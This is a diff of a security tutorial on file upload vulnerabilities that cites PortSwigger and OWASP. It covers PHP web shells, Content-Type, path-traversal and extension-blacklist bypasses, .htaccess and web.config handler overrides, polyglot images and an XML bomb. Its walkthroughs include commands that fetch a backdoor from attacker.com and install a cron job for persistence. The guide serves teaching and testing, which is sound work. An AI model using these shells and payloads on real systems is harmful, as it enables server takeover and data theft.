@@ -1,236 +1,309 @@
-# File upload vulnerabilities
+# File upload vulnerabilities (comprehensive guide)
 
-File upload vulnerabilities occur when web applications allow users to upload files without properly validating their name, type, content, or size. While file upload functionality is ubiquitous—profile pictures, document sharing, attachments—improper implementation can enable attackers to upload malicious files, particularly web shells, leading to complete server compromise. The severity ranges from stored XSS through uploaded HTML to full remote code execution via uploaded PHP, JSP, or ASP scripts.
+Based on PortSwigger Web Security Academy and OWASP Cheat Sheet Series
 
-The challenge with file upload security is that validation must be comprehensive—checking file extension, MIME type, content, size, and filename—while any single oversight can be exploited for devastating attacks.
+File upload vulnerabilities occur when web applications allow users to upload files without sufficiently validating their name, type, content, or size. While file upload is essential for modern applications (profile photos, documents, videos), improper implementation transforms this functionality into a critical attack vector. The severity ranges from denial-of-service through disk exhaustion to complete server compromise via web shell deployment and remote code execution.
+
+The core challenge: **any validation weakness—extension filtering, content checking, size limits, or filename sanitization—can enable attackers to upload and potentially execute malicious files**.
 
 > Only test systems you own or are explicitly authorized to assess.
 
 ## What are file upload vulnerabilities? (fundamentals)
 
-### The basic concept
+### The basic attack flow
 
-**Normal file upload flow:**
+**Legitimate use case:**
 ```
-1. User selects file (profile.jpg)
-2. Browser sends file to server
-3. Server validates file
-4. Server stores file safely
-5. File served when requested (as image)
-```
-
-**Vulnerable flow:**
-```
-1. User selects malicious file (shell.php disguised as image)
-2. Browser sends file to server
-3. Server performs weak/no validation ✗
-4. Server stores file in web-accessible directory ✗
-5. Attacker requests file → Server executes PHP code → RCE
+1. User uploads profile.jpg (actual image)
+2. Server validates: extension, MIME type, content
+3. Server stores: /uploads/user123/profile.jpg
+4. Server serves: As image with proper headers
+5. Result: Harmless image displayed
 ```
 
-### How servers handle static files
-
-**Extension to MIME type mapping:**
+**Attack scenario:**
 ```
-Server sees: profile.jpg
-Determines: MIME type = image/jpeg
-Action: Send file contents as image
-
-Server sees: script.php
-Determines: MIME type = application/x-httpd-php
-Action: Execute PHP code, return output
+1. Attacker uploads shell.php (malicious script disguised)
+2. Server validation: Bypassed or insufficient
+3. Server stores: /uploads/shell.php (web-accessible)
+4. Attacker requests: https://target.com/uploads/shell.php?cmd=whoami
+5. Result: Server executes PHP → Remote Code Execution
 ```
 
-**The vulnerability:** If attacker uploads `shell.php`:
-```
-1. File stored at: /var/www/uploads/shell.php
-2. Attacker requests: https://target.com/uploads/shell.php
-3. Server sees .php extension
-4. Server executes file as PHP code
-5. Result: Remote Code Execution
-```
+### Web shells (the primary goal)
 
-### Web shells (the ultimate goal)
-
-**Simple web shell:**
+**Simple file reader web shell:**
 ```php
-<?php system($_GET['cmd']); ?>
+<?php echo file_get_contents('/path/to/target/file'); ?>
 ```
 
-**Usage after upload:**
+**Usage:**
 ```
-https://target.com/uploads/shell.php?cmd=whoami
-Response: www-data
+https://target.com/uploads/shell.php
 
-https://target.com/uploads/shell.php?cmd=cat /etc/passwd
+Response: (contents of /etc/passwd, config files, source code)
+```
+
+**Command execution web shell:**
+```php
+<?php echo system($_GET['command']); ?>
+```
+
+**Usage:**
+```
+GET /uploads/shell.php?command=id HTTP/1.1
+Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+GET /uploads/shell.php?command=cat /etc/passwd HTTP/1.1
 Response: root:x:0:0:root:/root:/bin/bash...
 
-https://target.com/uploads/shell.php?cmd=ls -la
-Response: (directory listing)
+GET /uploads/shell.php?command=wget http://attacker.com/malware.sh HTTP/1.1
 ```
 
-**More sophisticated web shell:**
+**Full-featured web shell (more advanced):**
 ```php
 <?php
+// File browser and command executor
 if(isset($_REQUEST['cmd'])){
     $cmd = $_REQUEST['cmd'];
-    echo "<pre>";
-    echo shell_exec($cmd);
-    echo "</pre>";
-    die;
+    echo "<pre>" . shell_exec($cmd) . "</pre>";
 }
 ?>
 
-<!-- Web-based interface -->
 <html>
 <body>
 <form method="post">
-    Command: <input type="text" name="cmd" size="50">
+    <input type="text" name="cmd" placeholder="Enter command" size="80">
     <input type="submit" value="Execute">
 </form>
 </body>
 </html>
 ```
 
-### Impact levels
+### Impact severity levels
 
 **Critical - Remote Code Execution:**
 - Upload and execute web shell
-- Full server control
-- Read/write any file
-- Access databases
+- Full server control (read/write/execute)
+- Database access via local connection
 - Pivot to internal network
-- Install persistent backdoors
+- Data exfiltration
+- Persistent backdoor installation
+- Ransomware deployment
 
-**High - Sensitive file overwrite:**
-- Overwrite critical files (.htaccess, web.config)
-- Replace legitimate scripts with malicious ones
-- Denial of service (overwrite index.php)
+**High - System file compromise:**
+- Overwrite `.htaccess` or `web.config` (configuration hijacking)
+- Replace legitimate scripts (trojanization)
+- Overwrite critical system files
+- Directory traversal to sensitive locations
 
 **Medium - Client-side attacks:**
-- Stored XSS via uploaded HTML/SVG
+- Stored XSS via HTML/SVG upload
+- CSRF via uploaded HTML forms
 - Phishing via hosted malicious files
-- Malware distribution
+- Malware distribution (host becomes CDN for malware)
 
-**Low - Denial of Service:**
-- Fill disk space with large files
-- Resource exhaustion
+**Medium - Denial of Service:**
+- Disk space exhaustion (fill storage)
+- CPU/memory exhaustion (zip bombs, XML bombs)
+- Bandwidth exhaustion (large file downloads)
+
+**Low - Information disclosure:**
+- Upload file that reveals server paths in error messages
+- Source code disclosure via backup files
+
+## Threat landscape (from OWASP)
+
+### Malicious file threats
+
+**1) Parser exploitation:**
+- **ImageTrick Exploit**: Malformed images that exploit image processing libraries
+- **XXE (XML External Entity)**: Malicious XML in Office docs, SVG
+- **ZIP bombs**: Tiny file that decompresses to gigabytes
+- **XML bombs (Billion Laughs)**: Exponential entity expansion DOS
+
+**Zip bomb example:**
+```
+42.zip (42 KB)
+  └─ Uncompresses to: 4.5 petabytes
+  
+Result: Fills entire disk, crashes server
+```
+
+**XML bomb example:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+  <!-- ... continues to lol9 -->
+]>
+<lolz>&lol9;</lolz>
+```
+
+Result: Exponential memory consumption → DOS
+
+**2) File overwrite attacks:**
+- Upload file named `index.php` → overwrites legitimate homepage
+- Upload `config.php` → overwrites configuration
+- Upload `.htpasswd` → overwrites authentication file
+- Combined with path traversal: `../../important.php`
+
+**3) Phishing and social engineering:**
+- Upload fake job application form (HTML with credential harvesting)
+- Upload PDF with embedded malicious links
+- Upload document with macros (if subsequently downloaded by admin)
+
+### Public file retrieval threats
+
+**If uploaded files are publicly accessible:**
+
+**1) Information disclosure:**
+- Other users' uploads become accessible
+- Enumerate sequential filenames: `file1.pdf`, `file2.pdf`, etc.
+- Access confidential documents, personal data, trade secrets
+
+**2) Amplification DoS:**
+- Small HTTP request → Large file response
+- Attacker requests hundreds of large files simultaneously
+- Bandwidth/CPU exhaustion
+
+**3) Illegal content hosting:**
+- Upload copyrighted material → legal liability
+- Upload illegal content → service takedown, criminal charges
+- Offensive material → reputation damage
 
 ## Unrestricted file upload (no validation)
 
-### Vulnerability: No restrictions at all
+### Lab: Remote code execution via web shell upload
 
-**Vulnerable code:**
+**Vulnerable code (PHP):**
 ```php
 <?php
-if(isset($_FILES['file'])) {
-    $file = $_FILES['file'];
-    $filename = $file['name'];
-    $destination = '/var/www/uploads/' . $filename;
+// avatar-upload.php
+if(isset($_FILES['avatar'])) {
+    $file = $_FILES['avatar'];
+    $uploadDir = '/var/www/uploads/';
+    $filename = $file['name'];  // User-controlled!
     
-    // No validation whatsoever!
+    // NO VALIDATION AT ALL
+    $destination = $uploadDir . $filename;
     move_uploaded_file($file['tmp_name'], $destination);
     
-    echo "File uploaded: /uploads/$filename";
+    echo "Avatar uploaded: /uploads/$filename";
 }
 ?>
 ```
 
 **Exploitation:**
 
-**Step 1: Create web shell**
+**Step 1: Create PHP web shell**
 ```php
 // shell.php
 <?php system($_GET['cmd']); ?>
 ```
 
-**Step 2: Upload via legitimate form**
+**Step 2: Upload via form**
 ```html
-<form action="/upload" method="post" enctype="multipart/form-data">
-    <input type="file" name="file">
+<form action="/avatar-upload.php" method="post" enctype="multipart/form-data">
+    <input type="file" name="avatar">
     <input type="submit" value="Upload">
 </form>
 ```
 
-**Step 3: Access uploaded shell**
-```
-https://target.com/uploads/shell.php?cmd=whoami
+**Step 3: Access and execute**
+```bash
+# Verify upload
+curl https://target.com/uploads/shell.php
+Response: (blank or PHP source if not executed)
+
+# Execute commands
+curl "https://target.com/uploads/shell.php?cmd=whoami"
 Response: www-data
 
-https://target.com/uploads/shell.php?cmd=cat /etc/passwd
-Response: (password file contents)
+curl "https://target.com/uploads/shell.php?cmd=cat%20/etc/passwd"
+Response: root:x:0:0:root:/root:/bin/bash...
+
+curl "https://target.com/uploads/shell.php?cmd=ls%20-la%20/"
+Response: (filesystem listing)
 ```
 
-**Step 4: Establish persistent access**
-```
-# Download reverse shell
-?cmd=wget http://attacker.com/reverse.sh -O /tmp/r.sh
+**Step 4: Establish persistence**
+```bash
+# Download more capable shell
+curl "https://target.com/uploads/shell.php?cmd=wget%20http://attacker.com/backdoor.php%20-O%20/var/www/backdoor.php"
 
-# Make executable
-?cmd=chmod +x /tmp/r.sh
-
-# Execute
-?cmd=/tmp/r.sh
+# Create cron job for persistence
+curl "https://target.com/uploads/shell.php?cmd=echo%20'*/5%20*%20*%20*%20*%20/usr/bin/php%20/var/www/backdoor.php'%20|%20crontab%20-"
 ```
 
 ## Bypassing Content-Type validation
 
-### Vulnerability: Trusting client-supplied MIME type
+### Lab: Web shell upload via Content-Type restriction bypass
 
 **Vulnerable validation:**
 ```php
 <?php
 if(isset($_FILES['file'])) {
     $file = $_FILES['file'];
-    $contentType = $file['type'];  // From client!
     
-    // Only checks MIME type
+    // ONLY checks client-supplied Content-Type header
+    $contentType = $file['type'];  // From browser!
+    
     $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
     if(!in_array($contentType, $allowedTypes)) {
-        die("Only images allowed!");
+        die("Error: Only images allowed!");
     }
     
-    $filename = $file['name'];
-    move_uploaded_file($file['tmp_name'], "/var/www/uploads/$filename");
-    echo "Uploaded: /uploads/$filename";
+    // Saves with user-supplied filename
+    $destination = '/var/www/uploads/' . $file['name'];
+    move_uploaded_file($file['tmp_name'], $destination);
+    
+    echo "File uploaded successfully!";
 }
 ?>
 ```
 
-**Understanding multipart/form-data:**
-
-**Normal image upload request:**
+**Understanding multipart/form-data structure:**
 ```http
 POST /upload HTTP/1.1
 Host: target.com
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
-------WebKitFormBoundary7MA4YWxkTrZu0gW
+------WebKitFormBoundary
 Content-Disposition: form-data; name="file"; filename="profile.jpg"
 Content-Type: image/jpeg
 
-[JPEG binary data]
-------WebKitFormBoundary7MA4YWxkTrZu0gW--
+[Binary image data]
+------WebKitFormBoundary--
 ```
+
+**Key insight:** `Content-Type: image/jpeg` is **client-controlled** and trivially spoofed.
 
 **Exploitation with Burp Suite:**
 
-**Step 1: Upload legitimate image to capture request**
+**Step 1: Capture legitimate image upload**
 ```http
 POST /upload HTTP/1.1
+Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
 ------WebKitFormBoundary
 Content-Disposition: form-data; name="file"; filename="test.jpg"
 Content-Type: image/jpeg
 
-<JPEG data>
+ÿØÿà[JPEG binary data]
 ------WebKitFormBoundary--
 ```
 
-**Step 2: Intercept in Burp, modify:**
+**Step 2: Intercept in Burp Proxy → Send to Repeater**
+
+**Step 3: Modify request**
 ```http
 POST /upload HTTP/1.1
+Host: target.com
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
 ------WebKitFormBoundary
@@ -241,25 +314,48 @@ Content-Type: image/jpeg
 ------WebKitFormBoundary--
 ```
 
-**Key changes:**
-- `filename="shell.php"` ← Changed extension
-- `Content-Type: image/jpeg` ← Kept to bypass validation
-- Content: PHP code instead of image
+**Changes made:**
+- `filename="shell.php"` ← Malicious extension
+- `Content-Type: image/jpeg` ← Kept to fool validation
+- Content: PHP code instead of image data
 
-**Result:** Server sees `Content-Type: image/jpeg`, passes validation, saves as `shell.php`, executes when accessed.
+**Step 4: Send request**
+```
+Response: "File uploaded successfully!"
+```
+
+**Step 5: Execute web shell**
+```bash
+curl "https://target.com/uploads/shell.php?cmd=id"
+Response: uid=33(www-data) gid=33(www-data)
+```
+
+**Why it works:** Server trusts `Content-Type` header from client, never validates actual file content.
 
 ## Bypassing path restrictions via directory traversal
 
-### Vulnerability: Files restricted to upload directory but executable elsewhere
+### Lab: Web shell upload via path traversal
 
-**Scenario:**
-```
-/var/www/uploads/     ← No PHP execution (configured)
-/var/www/scripts/     ← PHP execution enabled
-/var/www/html/        ← PHP execution enabled
+**Scenario:** Uploads directory has PHP execution disabled, but parent directory doesn't.
+
+**Server configuration:**
+```apache
+# /var/www/uploads/.htaccess
+php_flag engine off  # Disables PHP execution in /uploads/
 ```
 
-**Vulnerable code:**
+**Directory structure:**
+```
+/var/www/
+  ├── html/           ← PHP executes here
+  │   ├── index.php
+  │   └── login.php
+  ├── uploads/        ← PHP does NOT execute here
+  │   └── .htaccess   (php_flag engine off)
+  └── scripts/        ← PHP executes here
+```
+
+**Vulnerable upload code:**
 ```php
 <?php
 $filename = $_FILES['file']['name'];
@@ -274,15 +370,14 @@ move_uploaded_file($_FILES['file']['tmp_name'], $destination);
 ?>
 ```
 
-**Exploitation using path traversal:**
+**Exploitation:**
 
-**Step 1: Craft filename with directory traversal**
+**Step 1: Test basic path traversal**
 ```http
 POST /upload HTTP/1.1
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
 
 ------WebKitFormBoundary
-Content-Disposition: form-data; name="file"; filename="../shell.php"
+Content-Disposition: form-data; name="file"; filename="../shell.jpg"
 Content-Type: image/jpeg
 
 <?php system($_GET['cmd']); ?>
@@ -291,48 +386,44 @@ Content-Type: image/jpeg
 
 **Result:**
 ```
-Destination: /var/www/uploads/../shell.php
-Resolves to: /var/www/shell.php
+Destination: /var/www/uploads/../shell.jpg
+Resolves to: /var/www/shell.jpg
 ```
 
-**Now accessible at root level where PHP executes!**
+**File now in parent directory where PHP executes!**
 
-**Alternative paths:**
-```
-filename="../../html/shell.php"
-filename="../../../var/www/html/shell.php"
-filename="..%2fshell.php"  (URL encoded)
-filename="....//shell.php"  (nested traversal)
+**Step 2: Access shell**
+```bash
+curl "https://target.com/shell.jpg?cmd=whoami"
+Response: www-data
 ```
 
-**If `.php` extension blocked, use image extension:**
+**Alternative traversal payloads:**
+```
+../shell.jpg           # One level up
+../../html/shell.jpg   # Into html directory
+../../../tmp/shell.jpg # Multiple levels
+```
+
+**Step 3: If simple traversal blocked, use encoding**
 ```http
-filename="../shell.jpg"
-Content-Type: image/jpeg
-
-<?php system($_GET['cmd']); ?>
+filename="..%2fshell.jpg"     # URL encoded
+filename="..%252fshell.jpg"   # Double encoded
+filename="....//shell.jpg"    # Nested traversal
 ```
-
-**Then access via extension override (if .htaccess uploadable):**
-```apache
-# Upload .htaccess to /uploads/
-AddType application/x-httpd-php .jpg
-```
-
-Now `shell.jpg` executes as PHP!
 
 ## Bypassing extension blacklists
 
-### Vulnerability: Incomplete blacklist of dangerous extensions
+### Lab: Web shell upload via extension blacklist bypass
 
-**Vulnerable code:**
+**Vulnerable blacklist:**
 ```php
 <?php
 $filename = $_FILES['file']['name'];
 $extension = pathinfo($filename, PATHINFO_EXTENSION);
 
-// Blacklist common dangerous extensions
-$blacklist = ['php', 'exe', 'sh', 'bat'];
+// Blacklist approach (WEAK)
+$blacklist = ['php', 'php3', 'php4', 'php5', 'phtml', 'exe', 'sh'];
 if(in_array(strtolower($extension), $blacklist)) {
     die("File type not allowed!");
 }
@@ -341,55 +432,56 @@ move_uploaded_file($_FILES['file']['tmp_name'], "/var/www/uploads/$filename");
 ?>
 ```
 
-### Bypass technique 1: Alternative PHP extensions
+### Bypass 1: Alternative executable extensions
 
-**Apache may execute:**
+**Apache-executable PHP extensions:**
 ```
-.php3
-.php4
-.php5
-.php7
-.phtml
-.phar
-.phps
+.php5    # PHP 5 files
+.php7    # PHP 7 files
+.phtml   # PHP HTML
+.phar    # PHP Archive
+.phps    # PHP source (sometimes executes)
+.php3    # PHP 3 (if not blacklisted)
+.shtml   # Server-side includes
+```
+
+**Check Apache configuration:**
+```apache
+# In apache2.conf or php.conf
+<FilesMatch \.ph(p[3-7]?|tml)$>
+    SetHandler application/x-httpd-php
+</FilesMatch>
 ```
 
 **Exploitation:**
 ```http
 POST /upload HTTP/1.1
 
-filename="shell.php5"
+filename="shell.php7"
 
 <?php system($_GET['cmd']); ?>
 ```
 
-If server configured to execute `.php5` files → RCE!
+If `.php7` not blacklisted but Apache executes it → RCE!
 
-**Check Apache config for enabled extensions:**
-```apache
-# In apache2.conf or .htaccess
-AddType application/x-httpd-php .php .php3 .php4 .php5 .phtml
-```
+### Bypass 2: Upload .htaccess configuration file
 
-### Bypass technique 2: Uploading .htaccess
-
-**Upload custom Apache configuration:**
-
-**File: .htaccess**
-```apache
-AddType application/x-httpd-php .jpg
-```
-
-**Exploitation workflow:**
+**Concept:** Upload Apache config file to enable execution of non-standard extensions.
 
 **Step 1: Upload .htaccess**
 ```http
 POST /upload HTTP/1.1
 
 filename=".htaccess"
+Content-Type: text/plain
 
 AddType application/x-httpd-php .jpg
+php_flag engine on
 ```
+
+**What this does:**
+- `AddType application/x-httpd-php .jpg` → Makes .jpg files execute as PHP
+- `php_flag engine on` → Enables PHP in directory
 
 **Step 2: Upload PHP code with .jpg extension**
 ```http
@@ -400,37 +492,56 @@ filename="shell.jpg"
 <?php system($_GET['cmd']); ?>
 ```
 
-**Step 3: Access shell**
+**Step 3: Execute**
+```bash
+curl "https://target.com/uploads/shell.jpg?cmd=whoami"
+Response: www-data  # PHP executed!
 ```
-https://target.com/uploads/shell.jpg?cmd=whoami
+
+**Alternative .htaccess directives:**
+```apache
+# Make ANY extension execute as PHP
+AddHandler application/x-httpd-php .anything
+
+# Specific extensions
+AddType application/x-httpd-php .png .gif .pdf
+
+# Via regex
+<FilesMatch "\.jpg$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
 ```
 
-Now `.jpg` files in that directory execute as PHP!
+### Bypass 3: Upload web.config (IIS/Windows)
 
-### Bypass technique 3: Uploading web.config (IIS)
+**For IIS servers:**
 
-**For Windows/IIS servers:**
-
-**File: web.config**
+**Step 1: Upload web.config**
 ```xml
+<?xml version="1.0" encoding="UTF-8"?>
 <configuration>
     <system.webServer>
-        <staticContent>
-            <mimeMap fileExtension=".jpg" mimeType="application/x-httpd-php" />
-        </staticContent>
         <handlers>
-            <add name="PHP_via_FastCGI" 
+            <add name="PHP_via_FastCGI_jpg" 
                  path="*.jpg" 
-                 verb="*" 
+                 verb="GET,POST" 
                  modules="FastCgiModule" 
                  scriptProcessor="C:\PHP\php-cgi.exe" 
-                 resourceType="Unspecified" />
+                 resourceType="Unspecified" 
+                 requireAccess="Script" />
         </handlers>
     </system.webServer>
 </configuration>
 ```
 
-**Or execute ASP code:**
+**Step 2: Upload PHP as .jpg**
+```
+shell.jpg containing PHP code
+```
+
+**Result:** IIS executes `.jpg` files as PHP.
+
+**For ASP/ASPX:**
 ```xml
 <configuration>
     <system.webServer>
@@ -438,198 +549,170 @@ Now `.jpg` files in that directory execute as PHP!
             <add name="ASP_jpg" 
                  path="*.jpg" 
                  verb="*" 
-                 type="ASP" />
+                 type="System.Web.UI.PageHandlerFactory" />
         </handlers>
     </system.webServer>
 </configuration>
 ```
 
-## Obfuscating file extensions
+## Obfuscating file extensions (advanced bypasses)
 
-### Technique 1: Case sensitivity bypass
+### Lab: Web shell upload via obfuscated file extension
 
-**Vulnerable (case-sensitive blacklist):**
-```php
-$blacklist = ['php', 'exe', 'sh'];
-$extension = pathinfo($filename, PATHINFO_EXTENSION);
+**Obfuscation techniques from PortSwigger + OWASP:**
 
-if(in_array($extension, $blacklist)) {  // Case-sensitive!
-    die("Blocked");
-}
+### Technique 1: Case variation
 ```
-
-**Bypass:**
-```
-shell.PHP   (uppercase)
-shell.PhP   (mixed case)
+shell.PHP     (if validation is case-sensitive)
+shell.PhP
 shell.pHp
+shell.Php
 ```
-
-If validation is case-sensitive but server execution is case-insensitive → bypass!
 
 ### Technique 2: Double extensions
-
-**Exploiting parsing differences:**
 ```
-shell.php.jpg
+shell.php.jpg   # Some parsers read right-to-left, others left-to-right
 shell.jpg.php
 shell.php.png
 ```
 
-**Why it works:** Different components may parse differently:
-- Validation checks: last extension = `.jpg` ✓
-- Server executes: first extension = `.php` → RCE
-
-**Apache precedence (right to left):**
-```
-shell.php.jpg → Processed as .jpg (safe)
-```
-
-**But with misconfiguration:**
-```apache
-AddHandler application/x-httpd-php .php
-```
-
-May process `shell.php.jpg` as PHP if it contains `.php` anywhere.
+**Why it works:**
+- Validation checks last extension: `.jpg` → Allowed
+- Apache processes first: `.php` → Executed
 
 ### Technique 3: Trailing characters
-
-**Add whitespace, dots, or special chars:**
 ```
-shell.php    (space)
-shell.php.   (trailing dot)
+shell.php     # Trailing space
+shell.php.    # Trailing dot
 shell.php..
-shell.php%20
-shell.php%0a (newline)
+shell.php...
 ```
 
-**Why it works:**
-- Validation strips trailing chars: `shell.php.` → `shell.php` → blocked
-- File system keeps them: `shell.php.` → stored as-is
-- Server accesses without trailing char: `shell.php` → executes
+**Different behaviors:**
+- **Validation:** May strip trailing chars → sees `shell.php` → blocks
+- **Or:** Keeps trailing chars → sees `shell.php.` → allows (not `.php`)
+- **Filesystem (Windows):** Automatically strips trailing dots → saves as `shell.php`
+- **Result:** Bypass!
 
-**Or validation doesn't strip but filesystem does:**
+### Technique 4: URL encoding
 ```
-Upload: shell.php.
-Validation sees: shell.php. → passes (not in blacklist)
-Windows filesystem saves as: shell.php (auto-strips trailing dot)
-Result: shell.php saved and executable
+shell%2ephp      # %2e = .
+shell%252ephp    # %25 = %, so %252e = %2e
+shell.ph%70      # %70 = p
+shell.p%68p      # %68 = h
 ```
 
-### Technique 4: Null byte injection
+**If validation doesn't decode but filesystem does:**
+```
+Validation sees: shell%2ephp (no .php found) → Allows
+Filesystem decodes: shell.php → Saves
+Result: PHP file saved!
+```
 
-**Historical vulnerability (PHP < 5.3.4):**
+### Technique 5: Null byte injection (legacy)
 ```
 shell.php%00.jpg
 shell.php\x00.jpg
 ```
 
-**How it worked:**
-- Validation sees: `shell.php%00.jpg` → `.jpg` extension → allowed
-- C-based file system functions stop at null byte: `shell.php` → saved
-- Result: `shell.php` stored and executable
-
-**Modern exploitation (rare):**
+**How it worked (PHP < 5.3.4):**
 ```php
-// Vulnerable code
-$ext = substr($filename, strrpos($filename, '.'));
-if(!in_array($ext, ['.jpg', '.png'])) die("Invalid");
+$filename = $_GET['filename'];  // "shell.php%00.jpg"
 
-move_uploaded_file($tmp, "/uploads/" . $filename);
+// Validation
+$ext = substr($filename, strrpos($filename, '.'));  // ".jpg"
+if($ext == '.jpg') {
+    // Passes!
+}
+
+// File operation (C-based function)
+fopen($filename, 'w');  // Stops at \x00, opens "shell.php"
 ```
 
-**Attack:**
-```
-filename: shell.php%00.jpg
+**Result:** Validation sees `.jpg`, file system saves `.php`
 
-Validation: strrpos finds last '.' → .jpg → passes
-File system: Stops at %00 → saves shell.php
-```
+**Modern status:** Mostly patched, but still found in legacy systems.
 
-### Technique 5: Nested extensions
-
-**If filter removes dangerous extension:**
-```php
-$filename = str_replace('.php', '', $filename);
-```
-
-**Bypass with nesting:**
+### Technique 6: Nested extensions
 ```
 shell.p.phphp
 ```
 
-**After filtering:**
+**If filter removes `.php` once:**
 ```
 shell.p.phphp
-      ^^^^^ removed
+       ^^^^ removed
 shell.php ← Dangerous extension remains!
 ```
 
 **Other nested patterns:**
 ```
-shell..phphp
-shell.p.phphp.jpg
-exploit.php.php.php (multiple removals)
+shell.php.php.php   # Multiple nesting
+exploit.p.ph.phphpp # Complex nesting
 ```
 
-### Technique 6: URL encoding
-
-**Encode dots or slashes:**
+### Technique 7: Multibyte Unicode characters (from PortSwigger)
 ```
-shell%2ephp     (. encoded)
-shell%252ephp   (double encoded)
-shell.ph%70     (p encoded)
-```
-
-**If validation doesn't decode but filesystem does:**
-```
-Validation sees: shell%2ephp → doesn't recognize .php → allows
-Filesystem decodes: shell.php → saves
-Result: RCE
+Sequences that convert to null bytes or dots:
+xC0 x2E → x2E (dot)
+xC4 xAE → x2E (dot)  
+xC0 xAE → x2E (dot)
 ```
 
-### Technique 7: Unicode/multibyte characters
-
-**Use Unicode sequences that normalize to dangerous chars:**
+**Usage:**
 ```
-shell.php (where . is Unicode lookalike)
-shell.php (where p is Cyrillic 'р')
-shell.phpẋ (where ẋ normalizes to nothing)
+shell.php[xC0 xAE]jpg
 ```
 
-**Or sequences that convert to null bytes:**
+**After UTF-8 → ASCII conversion:**
 ```
-xC0x2E → Becomes . after conversion
-xC0xAE → Becomes . after conversion
+shell.php.jpg
 ```
 
-## Bypassing content validation
+**If subsequent processing:**
+- Sees `.jpg` extension
+- But filename contains `.php` → May execute
 
-### Vulnerability: Checking magic bytes/file signatures
+### Technique 8: Semicolon injection (from PortSwigger)
+```
+shell.asp;.jpg
+shell.php;.jpg
+```
 
-**Common file signatures:**
-```
-JPEG: FF D8 FF E0 / FF D8 FF E1
-PNG:  89 50 4E 47 0D 0A 1A 0A
-GIF:  47 49 46 38 39 61  (GIF89a)
-PDF:  25 50 44 46  (%PDF)
-```
+**Language-dependent parsing:**
+- **High-level (PHP/Java):** Sees `.jpg` extension
+- **Low-level (C/C++):** Semicolon terminates → sees `.php`
+
+## Bypassing content validation (polyglot files)
+
+### Lab: Remote code execution via polyglot web shell upload
+
+**Scenario:** Server validates that file is actually an image (checks magic bytes, dimensions).
 
 **Vulnerable validation:**
 ```php
 <?php
-function isValidImage($file) {
-    $header = file_get_contents($file, false, null, 0, 4);
+function validateImage($file) {
+    // Check magic bytes
+    $handle = fopen($file, 'rb');
+    $header = fread($handle, 8);
+    fclose($handle);
     
-    // Check JPEG signature
-    if(bin2hex($header) == 'ffd8ffe0') {
-        return true;
+    // JPEG starts with FF D8 FF
+    if(substr($header, 0, 3) !== "\xFF\xD8\xFF") {
+        return false;
     }
     
-    return false;
+    // Check dimensions
+    $imageInfo = getimagesize($file);
+    if($imageInfo === false) {
+        return false;
+    }
+    
+    return true;
 }
 
-if(!isValidImage($_FILES['file']['tmp_name'])) {
+if(!validateImage($_FILES['file']['tmp_name'])) {
     die("Not a valid image!");
 }
 
@@ -637,88 +720,116 @@ move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/" . $_FILES['file']['n
 ?>
 ```
 
-### Bypass: Polyglot files (valid image + web shell)
+**The challenge:** File must be:
+1. Valid JPEG (passes magic byte check)
+2. Valid image dimensions (passes `getimagesize()`)
+3. Contains PHP code
+4. Saved with `.php` extension
 
-**Create hybrid JPEG + PHP:**
+### Creating polyglot files
 
-**Method 1: Prepend JPEG signature to PHP**
+**Method 1: ExifTool (easiest)**
 ```bash
-# Create valid JPEG header
-echo -ne '\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46' > shell.php
+# Start with legitimate JPEG
+wget http://example.com/image.jpg
 
-# Append PHP code
-echo '<?php system($_GET["cmd"]); ?>' >> shell.php
-```
-
-**Method 2: Use ExifTool to embed PHP in image metadata**
-```bash
-# Start with legitimate image
+# Embed PHP in comment metadata
 exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
 
-# Or in Description field
-exiftool -Description='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
+# Verify it's still valid image
+file shell.php
+# Output: shell.php: JPEG image data...
+
+# Verify PHP code embedded
+strings shell.php | grep "system"
+# Output: <?php system($_GET["cmd"]); ?>
 ```
 
-**Method 3: Manual hex editing**
+**Upload `shell.php` → Passes validation (valid JPEG) + Executes PHP**
+
+**Method 2: Manual hex editing**
 ```bash
 # 1. Get valid JPEG
-# 2. Open in hex editor
-# 3. Locate EXIF comment section
-# 4. Insert: <?php system($_GET["cmd"]); ?>
-# 5. Save as shell.php
+cp image.jpg shell.php
+
+# 2. Open in hex editor (hexedit, ghex, etc.)
+hexedit shell.php
+
+# 3. Locate EXIF comment section (search for "comment")
+# 4. Insert PHP code:
+#    3C 3F 70 68 70 20 73 79 73 74 65 6D 28 24 5F 47 45 54 5B 27 63 6D 64 27 5D 29 3B 20 3F 3E
+#    (hex for: <?php system($_GET['cmd']); ?>)
+
+# 5. Save
 ```
 
-**The file now:**
-- Has valid JPEG signature → passes content validation ✓
-- Contains PHP code in metadata
-- If saved as `.php` and accessed → PHP executes
-
-**Accessing the polyglot:**
-```
-https://target.com/uploads/shell.php?cmd=whoami
-
-Response: (image data + command output mixed)
-```
-
-### Advanced polyglot creation
-
-**Using GIF + PHP:**
+**Method 3: GIF + PHP hybrid**
 ```php
 GIF89a; <?php system($_GET['cmd']); ?>
 ```
 
-**Why it works:**
-- `GIF89a` = Valid GIF signature
-- `;` = Comment in GIF format
-- PHP code after comment
-- Passes GIF validation + executes as PHP
+**Save as `shell.php` and upload:**
+- `GIF89a` = Valid GIF header
+- `;` = Comment marker in GIF format
+- Everything after is ignored by image parsers
+- PHP interprets and executes the code
 
-**Using PNG + PHP:**
+**Method 4: PNG + PHP**
 ```bash
-# Create polyglot PNG
